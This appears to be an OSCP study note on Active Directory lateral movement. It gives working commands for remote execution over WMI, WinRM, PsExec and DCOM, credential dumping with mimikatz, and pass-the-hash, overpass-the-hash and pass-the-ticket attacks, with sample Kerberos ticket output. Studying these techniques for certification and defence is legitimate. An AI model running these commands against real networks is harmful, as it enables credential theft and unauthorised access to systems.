---
aliases:
  - Active Directory Lateral Movement
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - lateral_movement
  - 
author: Mehdi N Tehrani
creat_date: 2024-01-08
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# WMI
#wmi #windows_management_instrumentation

## Requirement
user should have local admin rights on the target host

## Process
Syntax:
```cmd
wmic /node:%host% /user:%username% /password:%pass% process call create "%process_name%"
```
example:
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

Syntax:
```powershell
$username = ''
$password = ''
$host_ip = ''
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $host_ip -Credential $credential -SessionOption $Options 
$command = '';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

This technique can be used to get a reverse shell as a certain user on a certain machine.

System processes and services always run in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361), as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, newly created processes through WMI are also spawned in session 0.

# WinRM
#winrm #remote_management #windows_remote_shell #winrs
Windows Remote Shell 
[WinRS](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)
```cmd
winrs -r %host% -u %user% -p %pass% %command%
```

#pssession #powershell_session
```powershell
New-PsSession $host [-Credential $creds]
Enter-PsSession $session_id
```

#port_5985 #port_5986
**WinRM** is the Microsoft version of the Web Services Management (open standard) [WS-Management](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port `5986` for encrypted HTTPS traffic and port `5985` for plain HTTP.

# PsExec
#psexec 
part of [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite

## Requirements
- SMB access to target host: #port_445
- Local admin privileges on target host
- `ADMIN$` share should be available on target host

## Mechanism
PsExec:
- Writes `psexesvc.exe` into the `C:\Windows` directory
- Creates and *spawns a service* on the remote host
- Runs the requested program/command as a *child process* of `psexesvc.exe`
## Process
Syntax:
```cmd
psexec.exe -i \\%host% -u %user% -p %pass%
```


# Pass the hash
#pass_the_hash #pth #wmiexec 
**Use NTLM instead of password**
*Use-case*: When we don't have access to another machine, but a user whose NTLM hash we had does
## Mechanism
The attacker connects to the victim using the _Server Message Block_ (SMB) protocol and performs authentication using the NTLM hash

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including:
- [PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/) from Metasploit
- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)

Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using [Named Pipes](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590(v=vs.85).aspx). This is done using the [Service Control Manager](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx) API.,
## Requirements
In summary, *smb* access with *local admin rights* on the target, *without having the password* but the *NTLM hash* instead.

#port_445 #smb
- SMB access to target: port `445`
- Local admin privileges on target host
- `ADMIN$` share should be available on target host
- Windows *File and Printer Sharing* feature to be *enabled*
- Obtaining a user's *NTLM hash* cached on a machine or obtained in some other way

## Process
#wmiexec #impacket #impacket-wmiexec
```sh
impacket-wmiexec -hashes $ntlm_hash "Administrator@$ip"
```


# Overpass the hash
#overpass_the_hash 
**Use NTLM hash to get a kerberos TGS ticket to access a service e.g. smb with psexec**
Use-case: *when we don't have access to a domain resource, but a user who does has a TGS ticket on a device we have admin access to*

[Blackhat article](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
we can "over" abuse an NTLM user hash to gain a full Kerberos _Ticket Granting Ticket_ (TGT). Then we can use the TGT to obtain a _Ticket Granting Service_ (TGS). This can be only done on the device we find the TGT to access domain resource TGS was made for. 

> If we want to export a TGS ticket and import it into a different device, *pass the ticket* attack should be considered.

if a user has logged into a machine, or even tried running a task as that user, the NTLM hash will be cached. We can obtain the hash using mimikatz and pass it to the current session.
## Requirements
#mimikatz #kerberos
- *local admin* to get the uers's NTLM hash or obtain any other way
- *local admin* to run *mimikatz* and use `sekurlsa::pth` module

## Process
#mimikatz #sekurlsa #sekurlsa_pth 
1. Get NTLM hash for target user
```mimikatz
sekurlsa::logonpasswords
```
2. *Pass the Hash*: this will get a kerberos ticket for target user and adds to our session
```mimikatz
sekurlsa::pth /user:<target_user> /domain:<domain> /ntlm:<target_user_ntlm_hash>
```
- this will open a new cmd
3. try accessing the desired resource, e.g. smb
```cmd
C:\> net use \\<server>
The command completed successfully.

klist

#0>     Client: dave @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 1/8/2024 4:57:16 (local)
        End Time:   1/8/2024 14:57:16 (local)
        Renew Time: 1/15/2024 4:57:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 1/8/2024 4:57:16 (local)
        End Time:   1/8/2024 14:57:16 (local)
        Renew Time: 1/15/2024 4:57:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
- Now we can access any resource the target user has access to. In the above example we can access web04 which dave has access to.
- or use `PsExec` to get a command line on this machine as the target user

## Monitor
#klist #kerberos #tickets
we can use `klist` to list available kerberos tickets for the current session
```

```
# Pass the ticket
#pass_the_ticket

Use-case: *a TGS ticket is found on a device we have admin access to, but we want to import it into another device*.

With *Overpass the hash* we can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. *Pass the ticket* allows us to export all tickets on a device and import it elsewhere


## Requirements
- admin access to a device 
## Process
1. Export all TGT/TGS tickets on a device we have admin access to
```mimikatz
sekurlsa::tickets /export
```
2. Import desired TGS ticket into a session
```mimikatz
kerberos::ptt <filename>.kirbi
```
Now we can access the resource TGS was meant for as the user the TGS ticket was issued for
## Monitor
#klist #kerberos #tickets
we can use `klist` to list available kerberos tickets for the current session


# DCOM
#dcom #com #common_object_model #distributed_common_object_model #executeshellcommand #document_activeview

[Cybereason article](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
[Enigma0x3 article](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

In this section, we will inspect a fairly recent lateral movement technique that exploits the Distributed Component Object Model ([DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)) and learn how it can be abused for [lateral movement](https://attack.mitre.org/techniques/T1021/003/).

The discovered DCOM lateral movement technique is based on the Microsoft Management Console ([MMC](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page)) COM application that is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN), which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for *local administrators*.

## Requirements


## Process
#reverse_shell #revsh #rev_shell
Create an instance of `MMC` on target device using DCOM and run a command against it. We can use this to get a reverse shell back. 
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "192.168.0.1"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
#                                              ^ command
#                                                   ^ directory
#                                                          ^ parameters
#                                                                    ^ WindowState
```

```powershell
$dcom

Document     : System.__ComObject
Frame        : System.__ComObject
Visible      : 0
UserControl  : 0
VersionMajor : 3
VersionMinor : 0
```

